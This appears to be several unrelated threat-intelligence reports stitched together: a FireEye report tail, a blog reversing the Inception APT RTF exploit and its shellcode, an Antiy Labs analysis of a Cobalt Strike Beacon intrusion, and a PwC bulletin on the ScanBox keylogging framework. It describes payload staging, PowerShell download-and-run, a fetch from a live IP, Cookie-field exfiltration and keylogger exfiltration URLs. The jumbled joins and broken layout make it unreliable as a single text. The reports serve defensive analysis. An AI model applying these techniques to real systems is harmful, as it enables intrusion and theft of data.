                                     family that is not publicly available.We have not       across the different stages of an attack life cycle.directly observed the Ajax Security Team use
                                     exploits to deliver malware, but it is unclear if they   The core of the FireEye platform is a virtual
                                     or other Iranian actors are capable of producing or      execution engine, complemented by dynamic
                                     acquiring exploit code.threat intelligence, to identify and block cyber
                                                                                              attacks in real time.We believe
                                     that if these actors continue the current pace of
                                     their operations they will improve their capabilities
                                     in the mid-term.We thank Kenneth Geers and Jen Weedon for their support and analysis on

                                                                                              these findings.FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com

© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
marks of their respective owners.– RPT.OSR.EN-US.082014



19 www.fireeye.comReversing the Inception APT malware

After reading the Inception paper by Snorre Fagerland and Waylon Grange, I got curious about this threat
and did some reversing.I felt that it would be good to write a technical blog about the process - maybe it
could be helpful or interesting for some.RTF file Analysis

MD5: 4a4874fa5217a8523bf4d1954efb26ef

Exploit: CVE-2012-0158

As we can see in following screen shot, this is a RTF [Rich Text Format] file.Its common that attackers use
document files such as these as bait.It is common that shellcode starts with a NOPsled.In following screenshot we can see that the embedded
shellcode starts with NOP slide.NOP, or No OPeration - is a single-byte opcode that does nothing.It has
the hex value of 0x90.Embedded Shellcode Analysis - First Level

Now, to the functionality of the shellcode.We will ignore the first two prolog instructions,  and for

remaining statements I have inserted comments to help understanding what is happening in this chunk of

code.It’s traversing the TEB, the PEB and the Ldr structure to get the base addresses of ntdll.dll and

kernel32.dll.It needs these to find the API addresses it requires for the rest of the infection.In screenshot below, Function 00120F82 is the malware's own GetProcAddress function which takes two
parameters

1.Base address of the system dll

2.Hash of the API name.The function returns the memory address of the API.Functionality of function 00120F82 ( GetProcAddress)

As shown in the next screenshot, this function parses the “export name pointer table” of the .dll [ex.kernel32.dll] and generates a hash for each function.It compares this with the argument API hash (Ex
DF7D9BAD for GetFileSize, see above screenshot) using the CMP EDI, ESI instruction.Once the matching
API is found it parses the Export Address Table and returns the respective API address to the caller in
EAX register.The document contains two levels of shellcode.We are analyzing first level, and in the following code we
can see a typical egghunting method: It attempts to open the already opened rtf file by checking file
handles in memory.It starts with a handle with the value 4 and verifies it by doing GetFileSize on it.If this
fails it does ADD ESI,4 again (adds 4 to the handle) until the API succeeds.When this happens it checks
the file offset 0x8300 for the marker 0x54405450.Again, if this matches up, it allocates memory into
which it reads the file content and jumps to the 2nd level shellcode with a JMP EBX.Second Level Shell Code Analysis

Now we have landed into the second level shellcode, but it is obfuscated to evade static analysis.At the
initial stage there are few instructions waiting to help us.This is the deobfuscation code.We can see that
0x23B * 4 is the number of bytes obfuscated, POP EBX is the get EIP instruction and 0x5687F945 is the
deobfuscation XOR key.In following code we can see the hexadecimal value that corresponds to the library name being pushed to
the LoadLibrary function, as well as two loops to get the API addresses using “CALL 02E203E2” function.Here also it uses hashes to look up APIs.GetCommandLineA 76DA08AC SetFilePointer

API

Hash
73E2D87E ExitProcess
7CB922F6 GlobalFree
36EF7370
0E8AFE98 WinExec
E9238AD9 _lwrite
E88A49EA _lcreat
5B8ACA33 GetTempPathA
0FFD97FB CloseHandle

Hash
0C0397EC
10FA6516

API
GlobalAlloc
ReadFile

DF7D9BAD GetFileSize
6DD38706
EB9E05F5
6E26C880
7FC7A3CB

CoUninitialize
CoSetProxyBlanket
CoCreateInstance
CoInitializeEx

In the following code it searches for the embedded VBS file inside the RTF file in memory.It checks for
the file size in a loop, and if the size is larger than 0x2000 then it sets the file ponter to 0x8C14 to compare
with the VBS file marker as we can see in following screenshot.After finding the VBS marker in memory, it decrypts the VBS file in two iterations.In the first loop it
decrypts and in the second loop it swaps the low and high bytes of the first 0x100 16-bit words, after which
it writes the file to a file named “Temp/ew_Rg.vbs”.Payload .VBS file Analysis

The following screenshot shows a part of the .VBS payload file dropped by .RTF file.First line is the

encrypted .dll 4th line contains Key to decrypt the .dll.Remaining part is self-explanatory.The instruction c = Crypt(c,k) function decrypts the encrypted dll and returns the decrypted dll.(See the
screenshot above)

c= encrypted dll.k = decryption key.Following function writes byte by byte to the dropped.dll file.Finally, the following code executes the “regsvr32” command to run the wmiprvse.dll in silent mode and
sets the run key in registry.Payload “wmiprvse.dll” file Analysis

This first level of deobfuscation in wmiprvse.dll takes around 3-4 minutes to finish.Then it allocates
memory using VirtualAlloc and writes the unpacked code to newly allocated memory before it jumps to
the unpacked code as shown in following screen shot.This dll has 3 layers of unpacking.The one above is level one,  below iyou can see level two.We can see
the passing of the control to the newly unpacked .dll @CALL EAX.It's very time-consuming to understand the functionality of the dll as it decrypts and builds its own
runtime import table to hinder the analysis.Analyst cannot directly see which API gets called.Finally we can see it’s connecting to webdav.cloudme.com and cleartext credentials in following
screenshot.Malware tries to communicate with the user account created at the WebDAV C&C to exfiltrate system and
user information.Reference:

https://www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes-%E2%80%9C-
inception-framework%E2%80%9D-very-sophisticated-layered-malwareAll rights reserved.Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

1  Background 

Recently,  ANTIY  Labs  detected  an  APT  attack  targeting  some  government  agency  in  China.The  Shellcode  for 

communication  is  conducted  depending  on  Beacon  mode  which  is  generated  on  the  basis  of  automatic  attack 

detection platform-Cobalt Strike.This kind of attack pattern disguising as non-malicious real file in the host of its 

target, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie 

field,  all  these  features  of  this  attack  pattern  are  designed  to  evade  the  detection  of  security  software  and  the 

interception  of  firewall  on  the  targeted  host.Considering  the  relationship  between  this  attack  and  Cobalt  Strike 

platform, we name it as APT-TOCS (TOCS refers to Threat on Cobalt Strike.)for now.The core step of APT-TOCS is downloading the script functionalities of Shellcode, which downloads a field of data 

into memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is 

generated  by  Cobalt  Strike  (An  automatic  attack  testing  platform).After  loading  the  script  of  Shellcode,  the 

Analysis  Group  of  ANTIY did  a  series of  correlation analysis,  then  we  found  a PE  program  that  maybe  act  as a 

guiding executable file in similar attacks.The loaded Shellcode script can be used to call command line to add a 

certain  field  of  encrypted  date  into  memory  and  run  it.The  decrypted  date  turns  out  to  be  executable  Shellcode 

which is generated by Cobalt Strike.The related script can be loaded via the guiding PE program or vulnerability.This kind of attack pattern has several features which including running in memory, no hard disk writing operations, 

communicating  via  Beacon,  multi-beacon  communication  is  acceptable,  and  several  Beacons  can  work 

simultaneously.Such  attack  can  be  launched  without  the  support  of  vector  file,  in  fact  it  depends  on  network 

projection  and  laterally  move  in  the  internal  network  as  required  conducting  an  attack.So,  it  will  bring  great 

difficulties  to  the  forensic  work.It  is  important  to  note  that,  all  the  Sandboxes  we  know  are  disabling  to  fight 

against this kind of attack.It  seems  that  the  attack  capability  of  APT-TOCS  is  close  to  that  of  APT-level.However,  it  relied  on  automatic 

attack testing platform instead of abilities of the attack team.2  Analysis on incident sample   

2.1  Leading files and sample downloading 

APT-TOCS  used “powershell.exe”  to execute Shellcode scripts to realize remote control on targeted system.The 

analysts  of  Antiy  thought  that  the  attacker  might  know  several  remote  injection  methods  of  script  downloading 

privilege, such as directly making the scrip be executed on the host by using security vulnerabilities.Meanwhile, 

we found the following binary leading attack files (hereinafter referred to as Sample A) were used in similar attacks 

before: 

Virus name 

Trojan/Win32.MSShell 

Original file name 

ab.exe 

MD5 

44BCF2DD262F12222ADEAB6F59B2975B 

Processor structure 

X86 

File size 

72.0 KB (73,802 bytes) 

©  Antiy  Labs.All  rights  reserved.Page  1 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

File format 

Time Stamp 

BinExecute/Microsoft.EXE[:X86] 

2009-05-10 07:02:12 

Digital signature 

NO 

Shell type 

Unknown 

Compilation language  Microsoft Visual C++ 

The functionality code of the scripts embedded in this PE sample is completely the same with the one of Shellcode 

script  Antiy  has  acquired,  while  the  encryption  data  of  them  differs  from  each  other.This PE  sample  was  firstly 

uploaded to Virustotal on May 2, 2015: 

Figure 1 Downloading encryption data using powershell.exe embedded in PE files 

The PE sample used WinExec to operate embedded malware: 

 

 

 

Figure 2 Using function WinExec to call powershell.exe to download leading data 

 

Therefore, we can see that the “leading file” can be regarded as the leading part of attack.However, the execution 

and control still can be made depending on system and application vulnerabilities without this leading file.According to above information, we cannot make sure this leading sample has relationship with this APT incident.©  Antiy  Labs.All  rights  reserved.Page  2 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

2.2  Key mechanism 

The core part of APT-TOCS relies on the encrypted data scripts (hereinafter referred to as Sample B) downloaded 

by PowerShell.Figure 1 consists of various derivation relationships and major module functionalities: 

 

 
Figure 3 Various derivation relationships and major module functionalities 

2.3  Analysis on the major sample (Sample B) of APT-TOCS 

The content (Here omitted the content of base64.)of Sample B is as follows: 

Figure 4 Content of Sample B 

 

The  functionality  of  this  part  of  script  is:  decrypting  the  encrypted  content  of  base64,  decompressing  with  Gzip, 

resulting in module 1 and using PowerShell to download and execute.2.4  Analysis on script 1 

The content of script 1 is as follows: 

©  Antiy  Labs.All  rights  reserved.Page  3 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

The  functionality  of  this  part  is:  decrypting  data  with  base64  encryption  and  getting  module  1,  then  writing  to 

Figure 5 Content of script 1 

 

process powershell.exe, and executing and operating.2.5  Analysis on module 1 

The  functionality  of  this  module  is  as  follows:  calling  the  function  of  wininet  module,  connecting  the  network, 

downloading operations of module 2; and executing by downloading to the memory.©  Antiy  Labs.All  rights  reserved.Page  4 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

Figure 6 shows that using request of HTTP GET to get file: http://146.0.43.107/hfYn.Figure 6 Request of HTTP GET   

2.6  Analysis on module 2 

Module 2 established and listed system process rundll32.exe: 

Figure 7 Establishing and listing process rundll32.exe 

 

Data that has been written into module 3: 

Figure 8 Data that has been written into module 3 

©  Antiy  Labs.All  rights  reserved.Page  5 

 

 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

 

Though  the data  of  module 3  started  with  “MZ”,  it  does  not  belong  to PE  files.Instead,  it  is  the  Shellcode  with 

backdoor functionality.Figure 9 Shellcode that started with MZ（4D 5A） 

 

2.7  Analysis on module 3 

The module might connect the following 2 addresses with port 80: 

  146.0.***.***  

 

 

 

(Romania) 

  dc.******69.info (146.0.***.***) (Romania) 

Sending request data and receiving return data.The decryption to above IP, domains and accessing addresses is “XOR 0x69”.Figure 10 Sending request data 

Judging from the module strings and the system functions, the module belongs to backdoor program that can send 

GET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds’ interval.The 

heartbeat  package  data  includes:  check  code,  process  ID,  system  version,  IP  address,  computer  name,  account, 

whether it is 64 bit process.Then it transmits by making use of both RSA and BASE64 encryption.©  Antiy  Labs.All  rights  reserved.Page  6 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

Figure 11 The original data of heartbeat package 

 

As the process ID and check code are different, the transmitted heartbeat package data are different each time.The 

check code is calculated through using process ID and the millisecond process during system startup.The algorithm 

is as follows: 

Figure 12 Algorithm of check code 

 

The encrypted heartbeat package used Cookie field to transmit: 

Figure 13 Content of the data package 

 

3  The authentication analysis on the technology sources of this attack 

The  leading  PE  files,  Sample_A  and  Sample  B,  associated  by  analysts  of  Antiy  CERT  used  the  exactly  same 

method  of  PowerShell.However,  we  cannot  eliminate  the  possibility  that  Sample_A  has  no  positive  connection 

with this attack due to the high standardization of relevant scripts.We still consider it as a series of attack incidents 

based on other comprehensive analysis.The attacker  might exploit  the following ways to control the target host, 

such  as  social  engineering  e-mails,  file  bundling,  exploiting  system  and  application  vulneratbilities,  lateral 

©  Antiy  Labs.All  rights  reserved.Page  7 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

movement of intranet and so on.We  found  “Beacon”  strings  when  analyzing  “Module  1”.According  to  existed  experience,  we  doubted  that 

Shellcode is closely related with automatic attack testing platform Cobalt Strike.Therefore, our analysts carried out 

comparison analysis on Beacon generated by Cobalt Strike, and authenticated the relationships between them.Cobalt Strike is the GUI framework penetration tool based on metasploit.The business version of it integrates the 

following characteristics: service scan, automatic overflow, multi-mode port espionage, various Trojan generation, 

phishing attack, site clone, target information obtaining, automatic browser attack and so on.3.1  Comparison of Module 1 

We compared module 1 and the payload generated by using Beacon, and found only the following different data: 

the Head data, request file name and IP address.The left is sample module 1, while the right is the module generated by Beacon.We can lead to the conclusion from 

  Figure 14 Comparison of Module 1 

the comparison: module 1 is generated by Beacon.The screenshot of data package in request is as follows: 

©  Antiy  Labs.All  rights  reserved.The following lists three 

points.XOR  decry
ption  at  t
h e   e n t r y
(Using  x86
/shikata_g
a_nai) 

Sample module 2 

Relevant Beacon files 

 

 

©  Antiy  Labs.All  rights  reserved.Page  9 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

 

 

The 
decrypted 
code 
at 
the entry 

Function 
calls 

 

 

3.3  Comparison analysis on module 3 data package 

The  following  figure  is  the  GET  request  comparison  of  the  module  generated  by  sample  module  3  and  Beacon.Here  we  can  see  both  of  them  use  Cookie  to  transmit  information  that  has  been  encrypted,  and  send  requests 

actively every 60 seconds.The data package is heartbeat.©  Antiy  Labs.All  rights  reserved.Cobalt Strike has the following characteristics: 

  Penetrating sandbox 

  Avoiding whitelist mechanism and cloud detection 

 

Intranet penetration 

  Persistent attacks 

  Attacking various platforms 

4  Conclusion 

With  an  automated  test  platform  Cobalt  Strike,  the  attack  penetration  can  penetrate  firewall,  the  approach  the 

attackers used to control targeted host is covert and undetectable; what’s more, it can attack various platforms, such 

©  Antiy  Labs.All  rights  reserved.Page  11 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

as  Windows,  Linux,  Mac  etc.;  it’s  formidable  adversary  to  Trusted  Computing,  Cloud  Detection,  Sandbox 

Detection  and  so  on.According  to  the  traces  in  the  past,  we  believe  that  the  threat  has  been  active  for  5  years; 

unfortunately, there isn’t any powerful detection production and methods to defeat the malicious attack till now.The reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it’s a kind of 

targeted  attack  (one  of  the  features  of  APT  attack),  it  has  anti-detection  functions  and  also  it  can  conceal  itself.Compared  with  APT  incidents  in  the  past,  the  APT  attack  in  this  case  doesn’t  cost  too  much,  and  the  attackers 

aren’t responsible for coding.With the application of commercial attack platform,    the attackers saved the cost of 

an attack, also the vulnerability built joint function provided by relevant attack platform make the attackers easy to 

do injection.As a result, nations and organizations which without its own elite hacker groups and abundant capital 

can  also  launch  some  kind  of  APT  attack  via  the  attack  pattern  mentioned  in  this  case.Meanwhile,  it’s  more 

difficult for us to tracing when facing such modeled attack.One  of  the  leaders  in  Information  Security  area-Bruce  Schiner  said,  “when  big  events  on  information  security 

happened,  people  tend  to  treat  it  as  an  example  of  cyber  warfare.It’s  ridiculous.From  my  point  of  view,  what’s 

happening  and  going  to  happen  is:  more  and  more  tactics  in  physical  warfare  are  applied  to  cyber  warfare.It’s 

important  to  note  that,  attack  capabilities  can  be  widely  distributed  if  attackers  take  full  advantages  of  certain 

technology,  especially  computer  technology  can  make  attack  more  powerful  and  automated.”  Obviously,  highly 

automated  commercial  platform  realized  a  high  speed  of  spread  of  this  attack  capability  (exceeded  our 

anticipation).We  have  to  remind  all  relevant  parties  that  we  are  confronting  with  the  risk  of  large  scale  diffusion  of  network 

armaments  which  is  led  by  the  low  cost  of  the  attack  capability.The  commercial  penetration  attack  detecting 

platform has two sides, on one hand, it can check the network environment of systems effectively, on the other hand, 

for nations, organizations and industries which has limited budget, it costs too much.Given the situation, all related 

parties  should  conduct  more  communication  with  each  other,  additionally,  there  is  no  doubt  that  both  offensive 

party  and  defensive  party  are  supported  by  superpowers,  these  superpowers  should  prevent  the  attack  technique 

from widely distributing.The incident mentioned there has no difference with other cases we detected in the past, it shows that, on the way to 

realize national informatizaion, we must fight against serious security challenges as we confronting now; it’s also a 

good  opportunity  for  our  Chinese  people  and  enterprises  to  demonstrate  our  faith  and  the  efforts  we  made  to 

conquer the challenge.Appendix 1 References of Cobalt Strike and the author 

Cobalt  Strike  is  the  business  version  of  Armitage  which  is  the  penetration  testing  software  of  Metasploit  figure 

interface  written  by  Java.Armitage  can  carry  out  automatic  attacks  by  combining  with  known  exploits  of 

Metasploit.It integrates the free version of Armitage under bt5 and kali linx, and the most powerful functionality is 

adding the Payload of Beacon.The first release time of Cobalt Strike is June, 2012.Version 

Description 

Cobalt  Strike1.45  and 

the 

It can connect the metasploit of Windows.Then it must connect metasploit of Linux.©  Antiy  Labs.All  rights  reserved.Page  12 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

former versions 

Cobalt Strike1.46 

System analyzer used return steps to check on Java report version, and fixed the exploits generated 

by private key.Cobalt Strike1.47 

Relieved multiple Beacon information backlog; had a overall check when dictograph was on.Cobalt Strike1.48 

Adding  timestomp  command  to  Beacon;  the  waiting  time  of  copying  bypassuac  privilege  files 

Cobalt Strike1.49 

Fixed Beacon HTTP Stager payload generator of Windows XP.lasted 10 seconds.Cobalt Strike2.0 

Cobalt Strike2.1 

Cobalt Strike2.2 

C&C of plasticity, adding option “veil” to the payload generator.PowerShell command started major local PowerShell; updated build.sh tool.Reconstructed the VNC server of process injecting and connecting with targeted system.The new 

process  is  easier  to  be  neglected  due  to  the  host  firewall.The  exploit  report  showed  URL  quotes 

from ZDI, MSB, US-CERT-VU and WPVDB.Cobalt Strike2.3 

Compiled  the  DNS  field  of  Beacon  with  customized  encoder.Beacon  added  command  runas  and 

pwd.Cobalt Strike2.4 

Adding time stamp to view - >web log; regenerating new default Beacon HTTPS certification with 

different parameters; then generating C2 HTTPS certification; updating executable files and default 

tool kit of DLLS.Author of Cobalt Strike: Raphael Mudge   

Raphael Mudge is the founder of Strategic Cyber LLC, a Washington, DC based company that creates software for 

red  teams.He  created  Armitage  for  Metasploit,  the  Sleep  programming  language,  and  the  IRC  client  jIRCii.Previously, Raphael worked as a security researcher for the US Air Force, a penetration tester, and he even invented 

a  grammar  checker  that  was  sold  to  Automattic.His  work  has  appeared  in  Hakin9, USENIX  ;login:,  Dr.  Dobb's 

Journal, on the cover of the Linux Journal, and the Fox sitcom Breaking In.Raphael regularly speaks on security 

topics and provides red team support to many cyber defense competitions.Education background: Syracuse University, Michigan Technological University 

Current position: Strategic Cyber LLC , Delaware Air National Guard 

 

Skills: software development, information security, object-oriented design, distributed system, figure interface, 

computer network design, blog system, social engineering, security research and so on.©  Antiy  Labs.All  rights  reserved.Sleep is open source, 

licensed under the LGPL. 

jIRCii 

Scriptable Internet Relay Chat client for Windows, MacOS X, and Linux.jIRCii is open source, licensed 

under the artistic license.Published works: 

Live-fire Security Testing with Armitage and Metasploit 

Get in through the backdoor: Post exploitation with Armitage 

Tutorial: Hacking Linux with Armitage 

©  Antiy  Labs.All  rights  reserved.All  rights  reserved.Page  15 

Analysis on APT-to-be Attack That Focusing on China's Government Agency 
 

http://www.linkedin.com/in/rsmudge 

Appendix 2 About Antiy 

Antiy  Labs is a professional next-generation security-testing engine R&D enterprise.Antiy’s engines provide the 

ability to detect various viruses and malware for network security products and mobile devices, which are used by 

more than ten well known security vendors.Antiy’s engines are embedded in tens of thousands of firewalls and tens 

of millions of mobile phones all over the world.Antiy Labs is awarded the “Best Protection” prize by AV-TEST in 

2013.Based  on  engines,  sandboxes  and  background  systems,  Antiy  Labs  will  continue  to  provide  traffic-based 

anti-APT solutions for enterprises.More information about antivirus engine, 

http://www.antiy.com (Chinese) 

More  information  about  anti-APT  products  of 

http://www.antiy.cn 

http://www.antiy.net (English) 

Antiy, 

 

©  Antiy  Labs.All  rights  reserved.Page  16Cyber Threat Operations

Tactical Intelligence Bulletin

ScanBox II

Date:
Contact:
Reference:
TLP:

2015-02-24
threatintelligence@uk.pwc.com
CTO-TIB-20150224-01A
WHITE

Tactical Intelligence Bulletin – TLP: WHITE

1.A deeper look into ScanBox

Please e-mail us at threatintelligence@uk.pwc.com for a version of this report with additional indicators
that you are welcome to distribute so long as it is not on public channels (TLP-GREEN).We have observed actors amending the ScanBox framework to evade existing public signatures, detailed
below.Overview

Security researchers have often made the mistake of assuming that when a specific tool was observed
being used in espionage attacks, it was representative of activity of a single actor.More frequently,
however, many are now identifying that distinct groups of attackers are sharing their toolsets, just as in
the cybercrime world.One such toolset, the ScanBox framework, is now shared between a number of groups who conduct
espionage attacks.Evidence suggests that these groups include those behind the recent Forbes and
Anthem attacks.This short paper outlines our current perspectives on the previously discussed espionage
groups currently using the framework and a hint that a 5th player is getting in on the game.ScanBox performs keylogging of users when they visit a compromised website, without requiring malware
to be deployed, and can collect a great deal of information which can be used to tailor future attacks

In October we published some details of the ScanBox tool set.Since then we have encountered 24
additional sites compromised with the framework.Over this time we have observed changes to the code
and novel techniques for executing.We have also received a number of tip offs from other researchers, as well as queries from victims who
were directly targeted by those using the framework.We would like to extend our thanks to these
individuals for their contributions towards this research.Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

Who’s using it, and who’s being targeted?Fears of proliferation

In some cases we have been able to watch developers update and test variants of the framework, and even
come across server-side code being tested by budding hackers.Our findings are detailed below.Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

2.Updates to the ScanBox Framework
Following on from our previous post on ScanBox1, we have watched the clusters of activity outlined with
close interest, as well as keeping an eye on new adopters of the ScanBox framework.For those who didn’t read our last entry on the framework, nor the excellent work by Jaime Blasco2 which
preceded it, ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform
reconnaissance and key logging of visitors to compromised websites without requiring any malware to be
downloaded or installed.The framework has remained in use since initial analyses were published, and further analysis of the code,
public reporting, as well as the infrastructure used to host ScanBox infections has given us a better picture
of some of the clusters of activity we identified in our earlier blog.Technical Updates

In addition to the four websites we previously identified hosting the malicious code, we’ve now identified
a further 24 websites hosting the framework.Anonymised data relating the countries and sectors affected
are given in appendix A.Broadly, the ScanBox framework codebase has remained the same, however there are slight nuances in
some aspects of the code, or in the software attackers choose to search for.Software checks

In cases where the attackers have included software checks within their ScanBox code, it tends to be for
the same original list of filenames (Appendix C).In some cases the attackers customise the list,
presumably based on the things they’re expecting to find.For example, adding or removing additional
security products based on the predominant software providers in their target region.It’s also worth noting that the standard list includes quite a lot of software which is less relevant to
security (examples include WinRAR, iTunes and WinZip).Some of these may be included in order to help
the attackers to try and identify real victims vs researchers/sandboxes/honeypots.This could then be used to tailor
future attacks (i.e.should I deploy malware which can bypass UAC?Should I send malicious documents
targeting CVE-2012-0158 or not?).Also, bizarrely the attackers check the path ‘Program Files (x80236)’ – if anyone knows what this
corresponds to, please get in touch and let us know.Avoiding analysis?As we stated earlier, some of the features of the original ScanBox code were probably designed to help
those analysing results distinguish between honeypots/analysis environments and real-world victims.The newly added variables include:





colorDepth – This may help to identify virtual machines which are typically configured with
specific graphics options.Local Time on the machine – checking that the local time on the machine matches the expected
time given the geo-location of the infected IP address – in many cases analysis environments are
not configured with the correct time.Updates to evade signatures

Possibly in response to our previous report, we’ve seen some of the groups using ScanBox alter the
content of the modules to evade detection.Attackers do read reports, both to help them attack3 and also to
evade detection.One change has been the URI formats used to deliver stolen key log data from obvious URLs such as:

/k.php?data=[KeyloggerData]

To more subtle URLs such as:

/[KeyloggerData].jpg

We also note that following our release of a signature to detect the phrase “No Java or Disable”,
which was present in a number of related frameworks, some of the attackers have now changed this to
"No or Disable".3 For example as in http://pwc.blogs.com/cyber_security_updates/2015/01/destructive-malware.html

Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

3.Previously… on ScanBox…
Clusters

In our previous entry on ScanBox we described four clusters of activity – this section includes updates on
those clusters.Previously, we were only able to cluster activity based on the infrastructure used and the associated
malware, we now have a sufficient number of samples to cluster based on differences in implementation
between the code used for ScanBox in each case.Flash Cluster (aka Cluster 1)

The recently published FBI flash alert #A-000049-MW4, cited domain names previously referenced in
our blog as being related to an actor known as Deep Panda, which we’ll get to in a minute.The link
appears to have been made from the use of the DerUsbi malware family though, which we know to be
used by several espionage actors.What is interesting is the potential overlap between the target selection of this cluster and the targets of
those behind the recently reported Forbes compromise5,6.Checking the Google SafeBrowsing results for *.googlecaches.com, shows that the domain was used for
distribution of malicious code for a significant period after our previous blog entry:

This includes distribution via gokbayrak.com.Looking at whether any other domains or IP addresses were
observed delivering malicious software via gokbayrak.com shows that it was also observed delivering
malware via 88.80.190[.]133.This is the same IP address that was cited in iSight’s reporting of the Forbes
breach.4 http://krebsonsecurity.com/wp-content/uploads/2015/02/fbi-pandaflash.png
5 http://www.invincea.com/2015/02/chinese-espionage-campaign-compromises-forbes/
6 http://www.isightpartners.com/2015/02/codoso/

Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

In fact, the IP address 88.80.190.133 was involved in the compromise of the same 3 websites as
SafeBrowsing shows were affected by googlecaches.com.The same three sites targeted with the 0-day used in the Forbes attack were also observed distributing
malware via googlecaches[.]com - we therefore believe it’s likely that the group we previously described as
‘Cluster 1’ was behind the Forbes compromise.We can use similar techniques to explore other actors who have the same tasking as Cluster 1.In the
screenshot of websites delivering malware via gokbayrak.com, we saw that the domain name
macanna.com[.]tw was also used to distribute malware from this page.Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

Whilst macanna.com[.]tw appears to be a legitimate site, it has also been observed as being a command
and control destination for malware.The malware sample in question has a hash of
3b8d7732de3b3c8823d241e7cd3185c4.The same sample also communicates with
happynewyear.dns04[.]com, which in turn resolves to the IP address 115.23.172[.]151, which hosts a large
number of other malicious host names:

Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

These following hostnames are activity associated with the actor best known as TH3Bug7 - named after
their choice of Poison Ivy password.Their malware samples are present in the same cluster:

7 http://researchcenter.paloaltonetworks.com/2014/09/recent-watering-hole-attacks-attributed-apt-group-th3bug-
using-poison-ivy/

Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

Deep Cluster (aka Cluster 2, centred on news.foundationssl[.]com)

This cluster relates to the threat actor referred to as Deep Panda by CrowdStrike, as was confirmed in a
recent blog post8.In turn, this is widely believed to relate to the incident at Anthem, as described in a
Krebs post9.The graph below shows the links between the we11point.com domain name, and
news.foundationssl[.]com as seen on the CrowdStrike blogpost:

The Krebs article also points toward other possible (although not explicit) links between the domain
allegedly used in the Anthem hack (we11point.com) to Cluster 2 through shared WHOIS details, as
we11point.com was registered by domain re-seller ‘li2384826402@yahoo.com’

On its own, this would not be sufficient to associate the two clusters, but it is useful to note as a ‘softer’
overlap.8 blog.crowdstrike.com/ironman-deep-panda-uses-sakula-malware-target-organizations-multiple-sectors/
9 http://krebsonsecurity.com/2015/02/anthem-breach-may-have-started-in-april-2014/

Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

Mystery Cluster 3 (aka Cluster 3, centered on qoog1e[.]com):

Cluster 3 remains a mystery, unfortunately the code used in this instance is the most slim line version,
and has since not been widely re-used – it is unclear who was behind the compromise using this domain
name.Evil Cluster (aka Cluster 4, centred on webmailgoogle[.]com):

We’d previously missed the link between Cluster 4 – and malware widely known as ‘EvilGrab’ or
‘Vidgrab’.From our view point, this malware is exclusively used by one group, known by CrowdStrike as
Stone Panda10.In addition to the four clusters outlined above, within the 24 additional compromises identified, we
believe there are at least 3 other distinct groups using the framework.Digital Quartermastering

In their 2013 paper ‘From Quartermaster to Sunshop’11, FireEye described the concept of a Digital
Quartermaster, a kind of malware supply chain for intrusions, where a skilled team would develop
toolsets for a range of attackers who deploy them.The shared use of ScanBox may match up quite well to
this hypothesis, and indeed even to some extent the naming schema overlaps, as iSight refer to the actor
behind the Forbes breach as Codoso, but suggest they are publically known as ‘Sunshop’.In all likelihood
this relates to a series of blogs byFireEye which refer to a series of web compromises in 2013 as being the
SunShop12 campaign.Although we did not notice the correlation immediately, there is good overlap between the groups we’ve
described above, and the clusters of activity described as sharing a Flash 0-day in early 2014 by
Symantec13.Although other groups have since begun using the framework, the first groups to use the
framework (clusters 1-4) correspond quite nicely to the existing Symantec blog.For reference, we’ve
overlaid our ScanBox clusters against the likely clusters Symantec created behind the scenes for their
blog, as well as other popular names:

ScanBox
Cluster

Cluster 1

CrowdStrike

Symantec
Group

Other Names

???Player 5 has entered the game….In all examples of ScanBox deployments discussed so far, we believe that the scripts were deployed to
anyone who visited websites of interest to a given sector which the attacker was able to compromise– and
that the attackers waited for victims to visit the compromised site.However one group of attackers using
the ScanBox framework are now actively sending e-mails to potential victims, where the e-mails contain
links to websites hosting ScanBox.We believe these attackers are not covered by the existing clusters 1
through 4, as the code differs from that used elsewhere.This method of sending links rather than waiting for visiting a specific compromised website has two
main advantages:





The advantage that the attacker doesn’t have to compromise sites that are relevant to the sector
they wish to perform reconnaissance against, so generally this will make things easier for the
attacker; and,

The attacker has to deal with fewer false positives in terms of data received from victims.Even
good IP whitelisting techniques will result in some false positives, by controlling the visitors
however they can ensure only those they want to scan are scanned.This group differs from the others based on the following characteristics:



They send e-mails with links to compromised websites, rather than compromising sites of interest
to their targets.So far we have identified four low key websites, all belonging to small companies based in the United
States or Canada which are being abused in this fashion.3.1.Going behind enemy lines – fears of proliferation and upcoming

attacks

At one point during our investigation into infrastructure hosting ScanBox code, we identified a server
which appeared to be used for development and testing purposes.On this occasion, the server side code
was publicly accessible, allowing us to gain insights into the development and testing phase of an attack
using ScanBox.This also included the ScanBox framework’s own detailed reconnaissance against the
developer themselves.We noted the developer repeatedly uploading the modified versions to VirusTotal, presumably in an
attempt to improve evasion of anti-virus.We do not believe this developer is part of the core group that has access to the original implementation,
but is instead another actor, who is likely rebuilding ScanBox from samples they find online.Cyber Threat Operations

Tactical Intelligence Bulletin – TLP:WHITE

